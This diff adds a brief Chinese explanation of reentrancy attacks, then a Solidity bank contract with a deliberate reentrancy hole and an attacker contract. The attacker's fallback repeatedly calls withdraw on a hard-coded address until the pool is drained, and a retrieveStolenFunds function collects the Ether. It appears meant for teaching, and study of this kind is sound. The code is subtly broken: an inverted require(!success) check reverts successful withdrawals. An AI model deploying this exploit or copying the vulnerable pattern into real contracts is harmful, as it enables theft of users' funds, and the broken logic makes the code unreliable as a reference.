@@ -1,0 +1,53 @@
+重入攻击就是攻击者对正常合约进行存款再取款的操作，会被触发回退函数，导致正常合约的逻辑无法正常实现，
+无法及时的更新存款者的余额，知道池子被抽干。
+ // SPDX-License-Identifier: MIT
+ pragma solidity ^0.8.7;
+ contract simpleReentrancy {
+   mapping (address => uint) private balances;
+    
+  function deposit() public payable  {
+   require((balances[msg.sender] + msg.value) >= balances[msg.sender]);                       
+     balances[msg.sender] += msg.value;}
+ 
+ function withdraw(uint withdrawAmount) public returns (uint) {
+  require(withdrawAmount <= balances[msg.sender]);
+        (bool success,) = msg.sender.call{value: withdrawAmount}("");
+        require(!success,"withdraw is success");
+    
+   balances[msg.sender] -= withdrawAmount;
+   return balances[msg.sender];
+ }
+    
+ function getBalance() public view returns (uint){
+   return balances[msg.sender];
+ }
+}
+ // SPDX-License-Identifier: MIT
+ pragma solidity ^0.8.7;
+ interface targetInterface{
+    function deposit() external payable; 
+      function withdraw(uint withdrawAmount) external; 
+    }
+   
+    contract simpleReentrancyAttack{
+      targetInterface bankAddress = targetInterface(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2); 
+      uint amount = 1 ether; 
+   
+  function deposit() public payable{
+    bankAddress.deposit{value: amount}();
+  }
+    
+  function attack() public payable{
+    bankAddress.withdraw(amount); 
+  }
+  
+ function retrieveStolenFunds() public payable {
+   payable(msg.sender).transfer(address(this).balance);
+  }
+  
+  fallback () external payable{ 
+    if (address(bankAddress).balance >= amount){
+         bankAddress.withdraw(amount);
+    }   
+  }
+}
